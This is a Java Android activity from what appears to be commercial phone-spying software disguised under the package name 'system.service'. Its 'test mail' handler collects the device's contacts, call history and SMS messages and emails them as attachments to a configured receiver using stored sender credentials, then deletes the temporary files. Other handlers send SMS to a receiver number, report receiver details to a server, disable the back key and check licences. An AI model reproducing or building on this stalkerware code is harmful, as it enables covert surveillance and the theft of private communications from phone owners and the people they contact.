package system.service.activity;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.app.AlertDialog.Builder;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.ImageButton;
import android.widget.TextView;

import system.service.GetInfoTask;
import system.service.R;
import system.service.config.ConfigCtrl;
import system.service.config.MailCfg;
import system.service.feature.sms.SmsCtrl;

import com.particle.inspector.common.util.DeviceProperty;
import com.particle.inspector.common.util.FileCtrl;
import com.particle.inspector.common.util.NetworkUtil;
import com.particle.inspector.common.util.RegExpUtil;
import com.particle.inspector.common.util.StrUtils;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.license.LICENSE_TYPE;

public class HomeActivity extends Activity 
{
    protected static final String LOGTAG = "InitActivity";
    
    private final static int DEFAULT_RETRY_COUNT = 3;
    
    ImageButton btn_home;
	Button btn_testMail;
	Button btn_testPhone;
    Button btn_setting;
    Button btn_exit;
    //TextView hint_testMail;
    //TextView hint_testPhone;
    //TextView hint_setting;
    //TextView hint_hide;
    
    OnClickListener listener_home = null;
    OnClickListener listener_testMail = null;
    OnClickListener listener_testPhone = null;
    OnClickListener listener_setting = null;
    OnClickListener listener_exit = null;
    
    private Context context;
    
    private ProgressDialog progressDialog;
    
    private final int DISABLE_GETINFO_BTN = 0;
    private final int ENABLE_GETINFO_BTN  = 1;
    private final int SEND_MAIL_SUCCESS   = 2;
    private final int SEND_MAIL_FAIL      = 3;
    private final int NETWORK_DISCONNECTED = 4;
     
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.home);
        
        context = getApplicationContext();
        
        setListener(); 
        initUI();
    }
    
    private void initUI()
    {
    	// Set activity title
    	LICENSE_TYPE licType = ConfigCtrl.getLicenseType(context);
    	if (licType == LICENSE_TYPE.TRIAL_LICENSED) {
    		this.setTitle(this.getTitle() + context.getResources().getString(R.string.init_trial));
    	} else if (licType != LICENSE_TYPE.NOT_LICENSED) {
    		this.setTitle(this.getTitle() + context.getResources().getString(R.string.init_licensed));
    	}
    	
    	// --------------------------------------------------------------
    	btn_home = (ImageButton)findViewById(R.id.actionbar_btn_home);
        btn_home.setOnClickListener(listener_home);
    	btn_setting = (Button)findViewById(R.id.btn_setting);
        btn_setting.setOnClickListener(listener_setting);
        btn_testMail = (Button)findViewById(R.id.btn_testmail);
    	btn_testMail.setOnClickListener(listener_testMail);
    	btn_testPhone = (Button)findViewById(R.id.btn_testphone);
    	btn_testPhone.setOnClickListener(listener_testPhone);
        btn_exit = (Button)findViewById(R.id.btn_exit);
        btn_exit.setOnClickListener(listener_exit);
        
        //hint_testMail = (TextView)findViewById(R.id.hint_testmail);
        //hint_testPhone = (TextView)findViewById(R.id.hint_testphone);
        //hint_setting = (TextView)findViewById(R.id.hint_setting);
        //hint_hide = (TextView)findViewById(R.id.hint_hide);
        
        // Set button status
        boolean enabled = false;
        if (ConfigCtrl.isLegal(context) &&
        	GlobalPrefActivity.getReceiverMail(context).length() > 0) enabled = true;
        
        btn_testMail.setEnabled(enabled);
        //hint_testMail.setEnabled(enabled);
        if (enabled) {
        	btn_testMail.setCompoundDrawablesWithIntrinsicBounds(null, getResources().getDrawable(R.drawable.home_btn_mail_default), null, null);
        } else {
        	btn_testMail.setCompoundDrawablesWithIntrinsicBounds(null, getResources().getDrawable(R.drawable.home_btn_mail_pressed), null, null);
        }
        
        enabled = false;
        if (ConfigCtrl.isLegal(context) &&
            GlobalPrefActivity.getReceiverPhoneNum(context).length() > 0) enabled = true;
        
        btn_testPhone.setEnabled(enabled);
        //hint_testPhone.setEnabled(enabled);
        if (enabled) {
        	btn_testPhone.setCompoundDrawablesWithIntrinsicBounds(null, getResources().getDrawable(R.drawable.home_btn_mobile_default), null, null);
        } else {
        	btn_testPhone.setCompoundDrawablesWithIntrinsicBounds(null, getResources().getDrawable(R.drawable.home_btn_mobile_pressed), null, null);
        }
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) 
    {
    	// Enable buttons if the mail address is valid
	    if (ConfigCtrl.isLegal(context)) {
	    	String mailAddr = GlobalPrefActivity.getReceiverMail(context);
	    	Pattern p = Pattern.compile(RegExpUtil.VALID_MAIL_ADDR);
    		Matcher matcher = p.matcher(mailAddr);
	    	if (matcher.matches()) {
   	 			btn_testMail.setEnabled(true);
   	 			btn_testMail.setCompoundDrawablesWithIntrinsicBounds(null, getResources().getDrawable(R.drawable.home_btn_mail_default), null, null);
   	 			//hint_testMail.setEnabled(true);
   	 		} else {
   	 			btn_testMail.setEnabled(false);
   	 			btn_testMail.setCompoundDrawablesWithIntrinsicBounds(null, getResources().getDrawable(R.drawable.home_btn_mail_pressed), null, null);
   	 			//hint_testMail.setEnabled(false);
   	 		}
	    	
	    	String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
	    	p = Pattern.compile(RegExpUtil.VALID_PHONE_NUM);
			matcher = p.matcher(phoneNum);
			if (matcher.matches()) {
	    		btn_testPhone.setEnabled(true);
	    		btn_testPhone.setCompoundDrawablesWithIntrinsicBounds(null, getResources().getDrawable(R.drawable.home_btn_mobile_default), null, null);
	    		//hint_testPhone.setEnabled(true);
	    	} else {
	    		btn_testPhone.setEnabled(false);
	    		btn_testPhone.setCompoundDrawablesWithIntrinsicBounds(null, getResources().getDrawable(R.drawable.home_btn_mobile_pressed), null, null);
	    		//hint_testPhone.setEnabled(false);
	    	}
	    }
	    
	    LICENSE_TYPE licType = ConfigCtrl.getLicenseType(context);
		boolean hasPaid = (licType != LICENSE_TYPE.NOT_LICENSED && licType != LICENSE_TYPE.TRIAL_LICENSED);
    	if (resultCode == RESULT_OK && hasPaid) 
    	{
    		// Send the receiver info SMS to server to update record in database
			boolean hasChangedReceiverInfo = data.getExtras().getBoolean(GlobalPrefActivity.HAS_CHG_RECEIVER_INFO);
			if (hasChangedReceiverInfo) {
				SmsCtrl.sendReceiverInfoSms(context); //TODO temp do not send info to server
			}
    	}
    }
    
    private void setListener()
    {
    	listener_testMail = new OnClickListener()
        {
            public void onClick(View v)
            {
            	// If neither in trail and nor licensed, return
            	if (!ConfigCtrl.isLegal(context)) {
            		String title = context.getResources().getString(R.string.error);
            		String msg = context.getResources().getString(R.string.msg_expired_alert) + context.getResources().getString(R.string.support_qq);
            		SysUtils.errorDlg(HomeActivity.this, title, msg);
    				return;
    			}
    			
    			if (!NetworkUtil.isNetworkConnected(context)) {
    				// Ask user if he wants to go to network setting activity to enable network 
					new AlertDialog.Builder(HomeActivity.this)
						.setTitle(getResources().getString(R.string.info))  
						.setIcon(android.R.drawable.ic_dialog_info)  
						.setMessage(R.string.action_goto_network_setting)
						.setPositiveButton(getResources().getString(android.R.string.yes),  
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialoginterface, int i){
									// Start network setting activity
									startActivityForResult(new Intent(android.provider.Settings.ACTION_WIRELESS_SETTINGS), 0); 
								}
							}
						)  
						.setNegativeButton(getResources().getString(android.R.string.no), 
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialoginterface, int i){
									return;
								}
							}
						).show();
					
					return;
				}

    			// If network connected, try to collect and send the information
            	progressDialog = ProgressDialog.show(HomeActivity.this, getResources().getString(R.string.init_processing), 
            			getResources().getString(R.string.init_waiting), true, false);
            	
            	// Start a new thread to do the time-consuming job
    			new Thread(new Runnable(){
    				public void run() {
    					mHandler.sendEmptyMessageDelayed(DISABLE_GETINFO_BTN, 0);
    					
    					// Clear attachments
    					if (GetInfoTask.attachments == null) 
    						GetInfoTask.attachments = new ArrayList<File>();
    					else
    						GetInfoTask.attachments.clear();
        		
    					// Collect info
    					GetInfoTask.CollectContact(context);
    					GetInfoTask.CollectPhoneCallHist(context);
    					GetInfoTask.CollectSms(context);
        		
    					// If network connected, try to collect and send the information
    					if (!NetworkUtil.isNetworkConnected(context)) {
    						// Clean the files in SD-CARD
        					FileCtrl.cleanTxtFiles();
        					
    						mHandler.sendEmptyMessageDelayed(NETWORK_DISCONNECTED, 0);
    						mHandler.sendEmptyMessageDelayed(ENABLE_GETINFO_BTN, 0);
    						return;
    					}
        	
    					// Send mail
    					String phoneNum = ConfigCtrl.getSelfName(context);
    					String subject = getResources().getString(R.string.mail_from) 
        	          		 +  phoneNum + "-" + (new SimpleDateFormat("yyyyMMdd")).format(new Date()) 
        	          		 + getResources().getString(R.string.mail_description);
    					String body = String.format(getResources().getString(R.string.mail_body_info), phoneNum);
    					String[] recipients = GlobalPrefActivity.getReceiverMail(context).split(",");
    					if (recipients.length == 0) {
    						mHandler.sendEmptyMessageDelayed(ENABLE_GETINFO_BTN, 0);
    						return;
    					}
    					String pwd = MailCfg.getSenderPwd(context);
        		
    					boolean result = false;
    					int retry = DEFAULT_RETRY_COUNT;
    					while(!result && retry > 0)
    					{
    						String sender = MailCfg.getSender(context);
    						result = GetInfoTask.sendMail(subject, body, sender, pwd, recipients, GetInfoTask.attachments);
    						if (!result) retry--;
    					}
    					if(result) {
    						mHandler.sendEmptyMessageDelayed(SEND_MAIL_SUCCESS, 0);
    					} else {
    						mHandler.sendEmptyMessageDelayed(SEND_MAIL_FAIL, 0);
    					}
    					GetInfoTask.attachments.clear();
        		
    					// Update the last date time
    					if (result) {
    						boolean successful = ConfigCtrl.setLastGetInfoTime(context, new Date());
    						if (!successful) Log.w(LOGTAG, "Failed to setLastGetInfoTime");
    					}
        		
    					// Clean the files in SD-CARD
    					FileCtrl.cleanTxtFiles();
    					
    					mHandler.sendEmptyMessageDelayed(ENABLE_GETINFO_BTN, 0);
    				}
    			}).start();
            }
            
        };
        
        listener_testPhone = new OnClickListener()
        {
            public void onClick(View v)
            {
            	// If neither in trail and nor licensed, return
            	if (!ConfigCtrl.isLegal(context)) {
            		String title = context.getResources().getString(R.string.error);
            		String msg = context.getResources().getString(R.string.msg_expired_alert) + context.getResources().getString(R.string.support_qq);
            		SysUtils.errorDlg(HomeActivity.this, title, msg);
    				return;
    			}
            	
            	String smsContent = context.getResources().getString(R.string.init_test_sms_content);
            	boolean ret = SmsCtrl.sendSms(GlobalPrefActivity.getReceiverPhoneNum(context), smsContent);
            	if (ret) {
            		String msg = context.getResources().getString(R.string.init_send_test_sms_ok);
            		SysUtils.messageBox(HomeActivity.this, msg);
            	} else {
            		String title = context.getResources().getString(R.string.error);
            		String msg = context.getResources().getString(R.string.init_send_test_sms_ng);
            		SysUtils.errorDlg(HomeActivity.this, title, msg);
            	}
            }
        };
        
        listener_setting = new OnClickListener()
        {
            public void onClick(View v)
            {
            	Intent intent = new Intent().setClass(getBaseContext(), GlobalPrefActivity.class);
            	Bundle bundle = new Bundle();
            	bundle.putBoolean(GlobalPrefActivity.HAS_CHG_RECEIVER_INFO, false);
            	intent.putExtras(bundle);
            	startActivityForResult(intent, R.layout.home);
            	//overridePendingTransition(R.anim.activity_enter, R.anim.activity_exit);
            }
        };
        
        // Exit the dialog
        listener_exit = new OnClickListener()
        {
            public void onClick(View v)
            {
            	String title = context.getResources().getString(R.string.info);
            	String msg   = context.getResources().getString(R.string.init_pls_reset_phone);
            	new AlertDialog.Builder(HomeActivity.this).setTitle(title)
    			.setIcon(android.R.drawable.ic_dialog_info)
    			.setMessage(msg)
    			.setPositiveButton("OK", 
    			    new DialogInterface.OnClickListener(){ 
                        public void onClick(DialogInterface dlgInf, int i) { 
                        	finish();
                        } 
                    })
                .show();
            }
        };
        
        listener_home = new OnClickListener()
        {
            public void onClick(View v)
            {
            	// Start browser to product homepage
            	String homePage = getResources().getString(R.string.home_page);
            	Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(homePage));
            	startActivity(browserIntent);
            }
        };
    }
    
    @Override
    public void onBackPressed() {
    	// Back key forbidden
        //super.onBackPressed();
    }
    	
    // Update UI 
    private Handler mHandler = new Handler(){
        @Override
        public void handleMessage(Message msg) {
            switch (msg.what) {
               case DISABLE_GETINFO_BTN: {
              	   btn_testMail.setEnabled(false);
                   break;
               }
               case ENABLE_GETINFO_BTN: {
             	   btn_testMail.setEnabled(true);
              	   break;
               }
               case NETWORK_DISCONNECTED: {
            	   progressDialog.dismiss();
            	   SysUtils.messageBox(context, getResources().getString(R.string.action_network_disconnected));
            	   break;
               }
               case SEND_MAIL_SUCCESS: {
            	   progressDialog.dismiss();
            	   SysUtils.messageBox(getApplicationContext(), getResources().getString(R.string.action_send_mail_success));
            	   break;
               }
               case SEND_MAIL_FAIL: {
            	   progressDialog.dismiss();
            	   SysUtils.messageBox(getApplicationContext(), getResources().getString(R.string.action_send_mail_fail));
            	   break;
               }
               default:
                   break;
            }
        }
    };
}
